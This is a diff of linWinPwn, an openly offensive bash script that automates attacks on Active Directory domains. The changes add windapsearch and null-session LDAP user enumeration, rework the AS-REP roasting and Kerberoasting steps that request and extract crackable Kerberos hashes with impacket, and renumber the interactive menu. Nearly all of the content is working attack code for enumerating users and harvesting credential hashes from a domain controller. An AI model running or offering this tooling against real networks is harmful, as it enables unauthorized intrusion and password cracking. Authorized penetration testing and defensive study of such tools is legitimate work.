@@ -1,7 +1,7 @@
 #!/bin/bash
 # Title: linWinPwn
 # Author: lefayjey
-# Version: 0.3.0
+# Version: 0.3.1
 
 #Colors
 RED='\033[1;31m'
@@ -48,7 +48,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN} version 0.3.0
+      ${BLUE}linWinPwn: ${CYAN} version 0.3.1
       ${NC}https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -60,7 +60,7 @@ help_linWinPwn () {
     echo -e "${YELLOW}Parameters${NC}"
     echo -e "-h/--help         Show the help message"
     echo -e "-t/--target       DC IP or target Domain ${RED}[MANDATORY]${NC}"
-    echo -e "-u/--username     Username (default: Guest)"
+    echo -e "-u/--username     Username (default: empty)"
     echo -e "-p/--password     Password or LM:NT Hash or location to Kerberos ticket './krb5cc_ticket' (default: empty)" 
     echo -e "-M/--modules      Comma separated modules to run (default: interactive)"
     echo -e "     ${CYAN}Modules available:${NC} interactive, ad_enum, kerberos, scan_shares, vuln_checks, mssql_enum, pwd_dump, user, all"
@@ -211,7 +211,7 @@ prepare (){
         kdc="$(echo $dc_FQDN | cut -d '.' -f 1)."
         auth_string="${YELLOW}[i]${NC} Authentication method: Kerberos Ticket of $user located at $(realpath $password)"
     
-    #Passwordc authentication is used
+    #Password authentication is used
     else
         target=${dc_ip}
         target_dc=${dc_ip_list}
@@ -368,9 +368,31 @@ ldapdomain_enum () {
     echo -e ""
 }
 
+windapsearch_enum () {
+    if [ ! -f "${scripts_dir}/windapsearch.py" ]; then
+        echo -e "${RED}[-] Please verify the location of windapsearch.py${NC}"
+    else
+        if [ "${kerb_bool}" == false ] && [ "${hash_bool}" == false ]; then
+            echo -e "${BLUE}[*] windapsearch Enumeration${NC}"
+            ${python} ${scripts_dir}/windapsearch.py ${argument_windap} --dc-ip ${dc_ip} --custom "objectClass=*" > ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt 2>/dev/null
+            ${python} ${scripts_dir}/windapsearch.py ${argument_windap} --dc-ip ${dc_ip} -C > ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt
+            ${python} ${scripts_dir}/windapsearch.py ${argument_windap} --dc-ip ${dc_ip} -G > ${output_dir}/DomainRecon/windapsearch_groups_${dc_domain}.txt
+        else
+                echo -e "${PURPLE}[-] windapsearch does not support kerberos tickets nor PTH${NC}"
+        fi
+
+        #Parsing user and computer lists
+        /bin/cat ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt 2>/dev/null | grep "cn:" | sed "s/cn: //g" | sort -u  > ${output_dir}/DomainRecon/users_list_windap_${dc_domain}.txt 2>&1
+        /bin/cat ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt 2>/dev/null | grep "cn:" | sed "s/cn: //g" | sort -u  > ${output_dir}/DomainRecon/servers_list_windap_${dc_domain}.txt 2>&1
+        /bin/cat ${output_dir}/DomainRecon/windapsearch_groups_${dc_domain}.txt 2>/dev/null | grep "cn:" | sed "s/cn: //g" | sort -u  > ${output_dir}/DomainRecon/groups_list_windap_${dc_domain}.txt 2>&1
+        echo ${dc_FQDN} >> ${output_dir}/DomainRecon/servers_list_${dc_domain}.txt 2>&1
+    fi
+    echo -e ""
+}
+
 ridbrute_attack () {
-    echo -e "${BLUE}[*] RID Brute Force (Null session)${NC}"
     if [ "${nullsess_bool}" == true ] ; then
+        echo -e "${BLUE}[*] RID Brute Force (Null session)${NC}"
         ${crackmapexec} smb ${target} ${argument_cme} --rid-brute 2>/dev/null > ${output_dir}/DomainRecon/cme_rid_brute_${dc_domain}.txt
         /bin/cat ${output_dir}/DomainRecon/rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | sed "s/ (SidTypeUser)\x1B\[0m//g" > ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt 2>&1
         count=$(wc -l ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt | cut -d " " -f 1)
@@ -382,9 +404,10 @@ ridbrute_attack () {
 users_enum () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${BLUE}[*] Users Enumeration (Null session)${NC}"
-        ${crackmapexec} smb ${target} ${argument_cme} --users > ${output_dir}/DomainRecon/users_nullsess_${dc_domain}.txt
-        /bin/cat ${output_dir}/DomainRecon/users_nullsess_${dc_domain}.txt 2>/dev/null | grep "${dc_domain}" | grep -v ":" | cut -d "\\" -f 2 | cut -d " " -f 1 > ${output_dir}/DomainRecon/users_list_nullsess_${dc_domain}.txt 2>&1
-        count=$(wc -l ${output_dir}/DomainRecon/users_list_nullsess_${dc_domain}.txt | cut -d " " -f 1)
+        ${crackmapexec} smb ${target} ${argument_cme} --users > ${output_dir}/DomainRecon/users_nullsess_smb_${dc_domain}.txt
+        ${crackmapexec} ldap ${target} -u '' -p '' --users --kdcHost "${kdc}${dc_domain}" > ${output_dir}/DomainRecon/users_nullsess_ldap_${dc_domain}.txt
+        /bin/cat ${output_dir}/DomainRecon/users_nullsess_smb_${dc_domain}.txt 2>/dev/null | grep "${dc_domain}" | grep -v ":" | cut -d "\\" -f 2 | cut -d " " -f 1 > ${output_dir}/DomainRecon/users_list_nullsess_${dc_domain}.txt 2>&1
+        count=$(cat ${output_dir}/DomainRecon/users_list_nullsess_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
         echo -e "${GREEN}[+] Found ${count} users using RPC User Enum"
         echo -e ""
     fi
@@ -569,11 +592,16 @@ asrep_attack () {
                 echo -e "${YELLOW}[i] No credentials for target domain provided. Using $users_list wordlist...${NC}"
                 users_scan_list=${users_list}
             fi
-            ${python} ${impacket_dir}/GetNPUsers.py ${dc_domain}/ -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
+            ${python} ${impacket_dir}/GetNPUsers.py "${dc_domain}/" -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
             /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
         else
             ${python} ${impacket_dir}/GetNPUsers.py ${argument_imp} -dc-ip ${dc_ip}
             ${python} ${impacket_dir}/GetNPUsers.py ${argument_imp} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
+        fi
+        if grep -q 'error' ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt; then
+            echo -e "${RED}[-] Errors during AS REP Roasting Attack... ${NC}"
+        else
+            /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
         fi
     fi 
     echo -e ""
@@ -583,18 +611,15 @@ kerberoast_attack () {
     if [ ! -f "${impacket_dir}/GetUserSPNs.py" ]; then
         echo -e "${RED}[-] GetUserSPNs.py not found! Please verify the installation of impacket${NC}"
     else
-        echo -e "${BLUE}[*] Kerberoast Attack${NC}"
-        ${python} ${impacket_dir}/GetUserSPNs.py ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain}
-        ${python} ${impacket_dir}/GetUserSPNs.py ${argument_imp} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
-        if grep -q 'error' ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt; then
-                echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
-            else
-                /bin/cat ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' > ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt
-        fi
-        if grep -q 'error' ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt; then
-            echo -e "${RED}[-] Errors during AS REP Roasting Attack... ${NC}"
-        else
-            /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
+        if [ "${nullsess_bool}" == false ] ; then
+            echo -e "${BLUE}[*] Kerberoast Attack${NC}"
+            ${python} ${impacket_dir}/GetUserSPNs.py ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain}
+            ${python} ${impacket_dir}/GetUserSPNs.py ${argument_imp} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
+            if grep -q 'error' ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt; then
+                    echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
+                else
+                    /bin/cat ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/' > ${output_dir}/Kerberos/kerberoast_hashes_${dc_domain}.txt
+            fi
         fi
     fi 
     echo -e ""
@@ -993,6 +1018,7 @@ webdav_check () {
 ad_enum () {
     bhd_enum
     ldapdomain_enum
+    windapsearch_enum
     ridbrute_attack
     users_enum
     passpol_enum
@@ -1058,20 +1084,21 @@ ad_menu () {
     echo -e "1) BloodHound Enumeration using all collection methods (Noisy!)"
     echo -e "2) BloodHound Enumeration using DCOnly"
     echo -e "3) ldapdomain Enumeration"
-    echo -e "4) RID Brute Force (Null session)"
-    echo -e "5) Users Enumeration (Null session)"
-    echo -e "6) Password Policy Enumeration"
-    echo -e "7) GPP Enumeration"
-    echo -e "8) Password not required Enumeration"
-    echo -e "9) ADCS Enumeration"
-    echo -e "10) Users Description containing word: pass"
-    echo -e "11) Get MachineAccountQuota"
-    echo -e "12) LDAP-signing check"
-    echo -e "13) Trusted-for-delegation check (cme)"
-    echo -e "14) Impacket findDelegation Enumeration"
-    echo -e "15) LdapRelayScan checks"
-    echo -e "16) certi.py Enumeration"
-    echo -e "17) Certipy Enumeration"
+    echo -e "4) windapsearch Enumeration"
+    echo -e "5) RID Brute Force (Null session)"
+    echo -e "6) Users Enumeration (Null session)"
+    echo -e "7) Password Policy Enumeration"
+    echo -e "8) GPP Enumeration"
+    echo -e "9) Password not required Enumeration"
+    echo -e "10) ADCS Enumeration"
+    echo -e "11) Users Description containing word: pass"
+    echo -e "12) Get MachineAccountQuota"
+    echo -e "13) LDAP-signing check"
+    echo -e "14) Trusted-for-delegation check (cme)"
+    echo -e "15) Impacket findDelegation Enumeration"
+    echo -e "16) LdapRelayScan checks"
+    echo -e "17) certi.py Enumeration"
+    echo -e "18) Certipy Enumeration"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -1099,66 +1126,63 @@ ad_menu () {
         ;;
 
         4)
-        argument_cme_tmp=$argument_cme
-        argument_cme="-d ${domain} -u ${user} -p ''"
-        nullsess_bool=true
+        windapsearch_enum
+        ad_menu
+        ;;
+
+        5)
         ridbrute_attack
-        argument_cme=$argument_cme_tmp
         ad_menu;;
 
-		5)
-        argument_cme_tmp=$argument_cme
-        argument_cme="-d ${domain} -u ${user} -p ''"
-        nullsess_bool=true
+		6)
         users_enum
-        argument_cme=$argument_cme_tmp
         ad_menu;;
         
-        6)
+        7)
         passpol_enum
         ad_menu;;
 
-        7)
+        8)
         gpp_enum
         ad_menu;;
 
-        8)
+        9)
         passnotreq_enum
         ad_menu;;
 
-        9)
+        10)
         adcs_enum
         ad_menu;;
 
-        10)
+        11)
         passdesc_enum
         ad_menu;;
 
-        11)
+        12)
         macq_enum
         ad_menu;;
 
-        12)
+        13)
         ldapsign_enum
         ad_menu;;
 
-        13)
+        14)
         deleg_enum_cme
         ad_menu;;
 
-        14)
+        15)
         deleg_enum_imp
         ad_menu;;
 
-        15)
+        16)
         ldaprelay_dump
         ad_menu;;
 
-        16)
+        17)
         certi_py_enum
         ad_menu;;
 
-        17)
+        18)
         certipy_enum
         ad_menu;;
 
@@ -1192,14 +1216,11 @@ kerberos_menu () {
 	case ${option_selected} in
         A)
         kerberos
+        kerberos_menu
         ;;
 
         1)
-        argument_cme_tmp=$argument_cme
-        argument_cme="-d ${domain} -u ${user} -p ''"
-        nullsess_bool=true
         kerbrute_enum
-        argument_cme=$argument_cme_tmp
         kerberos_menu
         ;;
 
